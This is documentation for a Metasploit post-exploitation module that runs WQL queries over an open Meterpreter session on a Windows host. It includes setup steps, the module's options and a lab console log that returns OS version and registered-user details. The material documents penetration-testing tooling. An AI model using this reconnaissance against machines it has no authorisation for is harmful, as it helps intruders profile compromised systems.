## Introduction

This module will execute a WQL query via Powershell's `Get-WmiObject`. A WQL query can be
explicity defined with the WQL and NAMESPACE options, or a hard-coded query can be used by
defining the ACTION option.

The following ACTIONs are available:

OSVERSION - Returns information about the operating system,
PROCESSINFO - Returns running processes.

## Vulnerable Application

  This should work on version of Windows with Powershell that support `Get-WmiObject`.

## Verification Steps

  1. Start `msfconsole`
  2. Get Meterpreter session
  3. `use post/windows/recon/wql_query`
  4. `run`
  5. **Verify** that operating system version info is returned
  6. `set ACTION ""`
  7. `set WQL select * from win32_operatingsystem`
  8. `run`
  9. **Verify** that more complete data comes back

## Options

  **ACTION**

  This is any of the predefined actions that are pre-baked in.

  **NAMESPACE**

  This will set the namespace to run any arbitrary WQL against.

  **WQL**

  An arbitrary WQL statement to run on the system.

## Proof of Concept

```

msf5 exploit(multi/handler) >
[*] https://192.168.170.1:8443 handling request from 192.168.170.128; (UUID: w43pepbp) Staging x86 payload (181337 bytes) ...
[*] Meterpreter session 1 opened (192.168.170.1:8443 -> 192.168.170.128:50319) at 2019-09-11 19:01:40 -0500
msf5 exploit(multi/handler) > use post/windows/recon/wql_query
msf5 post(windows/recon/wql_query) > show options

Module options (post/windows/recon/wql_query):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   ACTION     OSVERSION        no        Action query to run
   NAMESPACE                   no        Namespace to run the WQL query against
   RHOST      localhost        yes       Target address range
   SESSION                     yes       The session to run this module on.
   SMBDomain                   no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   TIMEOUT    10               yes       Timeout for WMI command in seconds
   WQL                         no        WQL query to run

msf5 post(windows/recon/wql_query) > set session 1
session => 1
msf5 post(windows/recon/wql_query) > run

[*] Executing WQL
[*] WQL result:

Version    BuildNumber
-------    -----------
10.0.17763 17763



[*] Post module execution completed
msf5 post(windows/recon/wql_query) > set ACTION ""
ACTION =>
msf5 post(windows/recon/wql_query) > set WQL select * from win32_operatingsystem
WQL => select * from win32_operatingsystem
msf5 post(windows/recon/wql_query) > run

[*] Executing WQL
[*] WQL result:


SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 17763
RegisteredUser  : chiggins
SerialNumber    : XXXXX-XXXXX-XXXXX-XXXXX
Version         : 10.0.17763

[*] Post module execution completed
```

